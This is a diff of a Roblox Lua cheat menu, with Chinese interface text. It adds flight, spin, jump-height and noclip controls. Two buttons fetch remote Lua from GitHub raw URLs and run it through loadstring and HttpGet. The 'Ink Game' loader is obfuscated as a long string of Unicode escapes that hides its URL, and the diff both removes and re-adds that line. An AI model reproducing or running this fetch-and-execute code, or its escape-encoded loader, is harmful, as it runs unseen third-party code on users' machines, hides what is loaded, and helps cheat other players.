-        loadstring("\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}\u{0028}\u{0067}\u{0061}\u{006d}\u{0065}\u{003a}\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}\u{0028}\u{0022}\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0072}\u{0061}\u{0077}\u{002e}\u{0067}\u{0069}\u{0074}\u{0068}\u{0075}\u{0062}\u{0075}\u{0073}\u{0065}\u{0072}\u{0063}\u{006f}\u{006e}\u{0074}\u{0065}\u{006e}\u{0074}\u{002e}\u{0063}\u{006f}\u{006d}\u{002f}\u{004a}\u{0073}\u{0059}\u{0062}\u{0036}\u{0036}\u{0036}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{005f}\u{0071}\u{0075}\u{006e}\u{002d}\u{0038}\u{0030}\u{0039}\u{0037}\u{0037}\u{0031}\u{0031}\u{0034}\u{0031}\u{002f}\u{0072}\u{0065}\u{0066}\u{0073}\u{002f}\u{0068}\u{0065}\u{0061}\u{0064}\u{0073}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{002f}\u{004d}\u{0053}\u{0059}\u{0058}\u{0022}\u{0029}\u{0029}\u{0028}\u{0029}")()
-    end)
-    
-    if not success then
-        warn("墨水游戏脚本加载失败: "..tostring(err))
-        InkGameButton.Text = "加载失败，点击重试"
-    else
-        InkGameButton.Text = "已加载!"
-        task.wait(1)
-        InkGameButton.Text = originalText
-    end
-end)
-
--- 关闭按钮点击事件
-CloseButton.MouseButton1Click:Connect(function()
-    toggleMainPanel()
-end)
-
--- 飞行开关按钮
-ToggleButton.MouseButton1Click:Connect(toggleFlight)
-
 -- 速度滑块交互逻辑
 local isDraggingFlightSpeed = false
 local isDraggingWalkSpeed = false
+local isDraggingSpinSpeed = false
+local isDraggingJumpHeight = false
 
 local function updateFlightSpeedFromInput(xPosition)
     local relativeX = xPosition - FlightSpeedSlider.AbsolutePosition.X
@@ -965,6 +1117,27 @@ local function updateWalkSpeedFromInput(xPosition)
     walkSpeed = math.floor(10 + (100 - 10) * percentage)
     
     updateSpeedDisplays()
+end
+
+local function updateSpinSpeedFromInput(xPosition)
+    local relativeX = xPosition - SpinSpeedSlider.AbsolutePosition.X
+    local percentage = math.clamp(relativeX / SpinSpeedSlider.AbsoluteSize.X, 0, 1)
+    spinSpeed = math.floor(10 + (100 - 10) * percentage)
+    
+    updateSpinSpeedDisplay()
+    
+    if isSpinning and spinConnection then
+        toggleSpin()
+        toggleSpin()
+    end
+end
+
+local function updateJumpHeightFromInput(xPosition)
+    local relativeX = xPosition - JumpHeightSlider.AbsolutePosition.X
+    local percentage = math.clamp(relativeX / JumpHeightSlider.AbsoluteSize.X, 0, 1)
+    jumpHeight = math.floor(10 + (100 - 10) * percentage)
+    
+    updateJumpHeightDisplay()
 end
 
 FlightSpeedSlider.InputBegan:Connect(function(input)
@@ -993,13 +1166,195 @@ WalkSpeedSlider.InputEnded:Connect(function(input)
     end
 end)
 
+SpinSpeedSlider.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDraggingSpinSpeed = true
+        updateSpinSpeedFromInput(input.Position.X)
+    end
+end)
+
+SpinSpeedSlider.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDraggingSpinSpeed = false
+    end
+end)
+
+JumpHeightSlider.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDraggingJumpHeight = true
+        updateJumpHeightFromInput(input.Position.X)
+    end
+end)
+
+JumpHeightSlider.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDraggingJumpHeight = false
+    end
+end)
+
 UserInputService.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         if isDraggingFlightSpeed then
             updateFlightSpeedFromInput(input.Position.X)
         elseif isDraggingWalkSpeed then
             updateWalkSpeedFromInput(input.Position.X)
+        elseif isDraggingSpinSpeed then
+            updateSpinSpeedFromInput(input.Position.X)
+        elseif isDraggingJumpHeight then
+            updateJumpHeightFromInput(input.Position.X)
         end
+    end
+end)
+
+-- 按钮点击事件
+ToggleButton.MouseButton1Click:Connect(toggleFlight)
+SpinToggle.MouseButton1Click:Connect(toggleSpin)
+NoclipToggle.MouseButton1Click:Connect(toggleNoclip)
+
+DoorsScriptButton.MouseButton1Click:Connect(function()
+    local originalText = DoorsScriptButton.Text
+    DoorsScriptButton.Text = "加载中..."
+    
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing/main/Blackking%20Game"))()
+    end)
+    
+    if not success then
+        warn("DOORS脚本加载失败: "..tostring(err))
+        DoorsScriptButton.Text = "加载失败，点击重试"
+    else
+        DoorsScriptButton.Text = "已加载!"
+        task.wait(1)
+        DoorsScriptButton.Text = originalText
+    end
+end)
+
+InkGameButton.MouseButton1Click:Connect(function()
+    local originalText = InkGameButton.Text
+    InkGameButton.Text = "加载中..."
+    
+    local success, err = pcall(function()
+        loadstring("\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}\u{0028}\u{0067}\u{0061}\u{006d}\u{0065}\u{003a}\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}\u{0028}\u{0022}\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0072}\u{0061}\u{0077}\u{002e}\u{0067}\u{0069}\u{0074}\u{0068}\u{0075}\u{0062}\u{0075}\u{0073}\u{0065}\u{0072}\u{0063}\u{006f}\u{006e}\u{0074}\u{0065}\u{006e}\u{0074}\u{002e}\u{0063}\u{006f}\u{006d}\u{002f}\u{004a}\u{0073}\u{0059}\u{0062}\u{0036}\u{0036}\u{0036}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{005f}\u{0071}\u{0075}\u{006e}\u{002d}\u{0038}\u{0030}\u{0039}\u{0037}\u{0037}\u{0031}\u{0031}\u{0034}\u{0031}\u{002f}\u{0072}\u{0065}\u{0066}\u{0073}\u{002f}\u{0068}\u{0065}\u{0061}\u{0064}\u{0073}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{002f}\u{004d}\u{0053}\u{0059}\u{0058}\u{0022}\u{0029}\u{0029}\u{0028}\u{0029}")()
+    end)
+    
+    if not success then
+        warn("墨水游戏脚本加载失败: "..tostring(err))
+        InkGameButton.Text = "加载失败，点击重试"
+    else
+        InkGameButton.Text = "已加载!"
+        task.wait(1)
+        InkGameButton.Text = originalText
+    end
+end)
+
+-- 分类按钮点击事件
+homeButton.MouseButton1Click:Connect(function()
+    homePage.Visible = true
+    generalPage.Visible = false
+    doorsPage.Visible = false
+    inkGamePage.Visible = false
+    updateTime()
+end)
+
+generalButton.MouseButton1Click:Connect(function()
+    homePage.Visible = false
+    generalPage.Visible = true
+    doorsPage.Visible = false
+    inkGamePage.Visible = false
+    updateSpeedDisplays()
+    updateSpinSpeedDisplay()
+    updateJumpHeightDisplay()
+end)
+
+doorsButton.MouseButton1Click:Connect(function()
+    homePage.Visible = false
+    generalPage.Visible = false
+    doorsPage.Visible = true
+    inkGamePage.Visible = false
+end)
+
+inkGameButton.MouseButton1Click:Connect(function()
+    homePage.Visible = false
+    generalPage.Visible = false
+    doorsPage.Visible = false
+    inkGamePage.Visible = true
+end)
+
+-- 关闭按钮点击事件
+CloseButton.MouseButton1Click:Connect(function()
+    MainPanel.Visible = not MainPanel.Visible
+    
+    if MainPanel.Visible then
+        -- 打开动画
+        MainPanel.Size = UDim2.new(0, 0, 0, 0)
+        MainPanel.Visible = true
+        TweenService:Create(MainPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500 * UI_SCALE, 0, 400 * UI_SCALE)}):Play()
+        
+        homePage.Visible = true
+        generalPage.Visible = false
+        doorsPage.Visible = false
+        inkGamePage.Visible = false
+        updateTime()
+    else
+        -- 关闭动画
+        TweenService:Create(MainPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+        task.wait(0.2)
+        MainPanel.Visible = false
+    end
+end)
+
+-- 悬浮球点击事件
+FloatingBall.MouseButton1Click:Connect(function()
+    MainPanel.Visible = not MainPanel.Visible
+    
+    if MainPanel.Visible then
+        -- 打开动画
+        MainPanel.Size = UDim2.new(0, 0, 0, 0)
+        MainPanel.Visible = true
+        TweenService:Create(MainPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500 * UI_SCALE, 0, 400 * UI_SCALE)}):Play()
+        
+        homePage.Visible = true
+        generalPage.Visible = false
+        doorsPage.Visible = false
+        inkGamePage.Visible = false
+        updateTime()
+    else
+        -- 关闭动画
+        TweenService:Create(MainPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+        task.wait(0.2)
+        MainPanel.Visible = false
+    end
+end)
+
+-- 角色变化处理
+player.CharacterAdded:Connect(function(character)
+    character:WaitForChild("Humanoid")
+    updateSpeedDisplays()
+    updateSpinSpeedDisplay()
+    updateJumpHeightDisplay()
+    
+    if isFlying then
+        task.spawn(function()
+            task.wait(0.1)
+            toggleFlight()
+            toggleFlight()
+        end)
+    end
+    
+    if isNoclip then
+        for _, part in ipairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+    
+    if isSpinning then
+        task.spawn(function()
+            task.wait(0.1)
+            toggleSpin()
+            toggleSpin()
+        end)
     end
 end)
 
@@ -1010,12 +1365,18 @@ local function initializeUI()
     
     -- 更新速度显示
     updateSpeedDisplays()
+    updateSpinSpeedDisplay()
+    updateJumpHeightDisplay()
     
     -- 初始角色处理
     if player.Character then
         if isFlying then
             isFlying = false
             toggleFlight()
+        end
+        if isSpinning then
+            isSpinning = false
+            toggleSpin()
         end
     end
     
@@ -1027,24 +1388,6 @@ local function initializeUI()
     MainPanel.Visible = false
     MainPanel.Size = UDim2.new(0, 500 * UI_SCALE, 0, 400 * UI_SCALE)
 end
-
--- 角色变化处理
-player.CharacterAdded:Connect(function(character)
-    character:WaitForChild("Humanoid")
-    updateSpeedDisplays()
-    if isFlying then
-        task.spawn(function()
-            task.wait(0.1)
-            toggleFlight()
-            toggleFlight()
-        end)
-    end
-end)
-
--- 悬浮球点击事件
-FloatingBall.MouseButton1Click:Connect(function()
-    toggleMainPanel()
-end)
 
 -- 启动UI
 task.spawn(function()
